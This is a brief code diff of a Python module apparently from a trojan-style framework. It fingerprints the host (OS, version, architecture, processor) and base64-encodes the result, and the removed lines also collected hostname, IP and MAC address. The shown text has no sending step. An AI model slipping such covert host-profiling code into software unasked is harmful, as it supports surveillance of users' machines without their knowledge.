@@ -2,16 +2,13 @@
 import platform,socket,re,uuid, psutil, base64
 
 def run(**args):
-    info={}
-    info['platform']=platform.system()
-    info['platform-release']=platform.release()
-    info['platform-version']=platform.version()
-    info['architecture']=platform.machine()
-    info['hostname']=socket.gethostname()
-    info['ip-address']=socket.gethostbyname(socket.gethostname())
-    info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    info['processor']=platform.processor()
-    info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+    info = platform.system()
+    info += platform.release()
+    info += platform.version()
+    info += platform.machine()
+    info += platform.processor()
+    
+
     # encode info to base64 
     b = bytes(str(info), encoding='utf-8')
     encoded_string = base64.b64encode(b)
